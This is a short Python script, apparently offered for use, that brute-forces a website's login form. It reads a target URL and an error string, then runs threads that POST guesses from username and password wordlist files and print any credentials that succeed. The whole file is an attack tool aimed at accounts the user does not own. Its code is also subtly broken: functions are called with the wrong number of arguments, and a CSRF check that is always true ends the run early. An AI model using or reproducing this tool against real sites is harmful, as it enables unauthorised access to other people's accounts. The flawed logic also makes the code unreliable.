import threading
import requests
import sys

class BruteForceCracker:
    def __init__(self, url, error_message):
        self.url = url
        self.error_message = error_message

    def crack(self, username, password):
        data_dict = {"LogInID": username, "Password": password, "Log In": "submit"}
        response = requests.post(self.url, data=data_dict)
        if self.error_message in str(response.content):
            return False
        elif "CSRF" or "csrf" in str(response.content):
            print("CSRF Token Detected!! BruteF0rce Not Working This Website.")
            sys.exit()
        else:
            print("Username: ---> " + username)
            print("Password: ---> " + password)
            return True

def crack_usernames(usernames, cracker):
    count = 0
    for username in usernames:
        count += 1
        username = username.strip()
        print("Trying username: {} Time for => {}".format(count, username))
        if cracker.crack(username):
            return
        
def crack_passwords(passwords, cracker):
    count = 0
    for password in passwords:
        count += 1
        password = password.strip()
        print("Trying Password: {} Time For => {}".format(count, password))
        if cracker.crack(password):
            return

def main():
    url = input("Enter Target Url: ")
    error = input("Enter Wrong Password Error Message: ")
    cracker = BruteForceCracker(url, error)
    with open("username.txt", "r") as f:
        chunk_size = 1000
        while True:
            usernames = f.readlines(chunk_size)
            if not usernames:
                break
            t = threading.Thread(target=crack_usernames, args=(usernames, cracker))
            t.start()
    
    with open("paswd.txt", "r") as f:
        chunk_size = 1000
        while True:
            passwords = f.readlines(chunk_size)
            if not passwords:
                break
            t = threading.Thread(target=crack_passwords, args=(passwords, cracker))
            t.start()

if __name__ == '__main__':
    main()
